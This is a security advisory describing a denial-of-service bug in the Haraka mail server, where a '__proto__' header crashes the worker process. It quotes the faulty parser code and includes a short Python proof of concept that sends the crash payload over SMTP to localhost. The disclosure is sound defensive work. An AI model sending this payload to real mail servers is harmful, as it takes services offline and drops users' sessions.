summary: "Haraka affected by DoS via `__proto__` email header\n### Summary\n\nSending an email\
  \ with `__proto__:` as a header name crashes the Haraka worker process. \n\n### Details\n\n\
  The header parser at `node_modules/haraka-email-message/lib/header.js:215-218` stores headers\
  \ in a plain `{}` object:\n\n```javascript\n_add_header(key, value, method) {\n    this.headers[key]\
  \ ??= []          // line 216\n    this.headers[key][method](value)  // line 217\n}\n```\n\
  \nWhen `key` is `__proto__`:\n1. `this.headers['__proto__']` returns `Object.prototype` (the\
  \ prototype getter)\n2. `Object.prototype` is not null/undefined, so `??=` is skipped\n3.\
  \ `Object.prototype.push(value)` throws `TypeError: not a function`\n\nThe TypeError reaches\
  \ the global `uncaughtException` handler at `haraka.js:26-33`, which calls `process.exit(1)`:\n\
  \n```js\nprocess.on('uncaughtException', (err) => {\n    if (err.stack) {\n        err.stack.split('\\\
  n').forEach((line) => logger.crit(line))\n    } else {\n        logger.crit(`Caught exception:\
  \ ${JSON.stringify(err)}`)\n    }\n    logger.dump_and_exit(1)\n})\n```\n\n### PoC\n\n```python\n\
  import socket, time\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.settimeout(5)\n\
  sock.connect((\"127.0.0.1\", 2525))\nsock.recv(4096)\nsock.sendall(b\"EHLO evil\\r\\n\");\
  \ sock.recv(4096)\nsock.sendall(b\"MAIL FROM:<x@x.com>\\r\\n\"); sock.recv(4096)\nsock.sendall(b\"\
  RCPT TO:<user@haraka.local>\\r\\n\"); sock.recv(4096)\nsock.sendall(b\"DATA\\r\\n\"); sock.recv(4096)\n\
  # Crash payload\nsock.sendall(b\"From: x@x.com\\r\\n__proto__: crash\\r\\n\\r\\nbody\\r\\\
  n.\\r\\n\")\n```\n\n### Impact\n\nIn single-process mode (`nodes=0`), the entire server goes\
  \ down. In cluster mode, the master restarts the worker, but all sessions are lost."
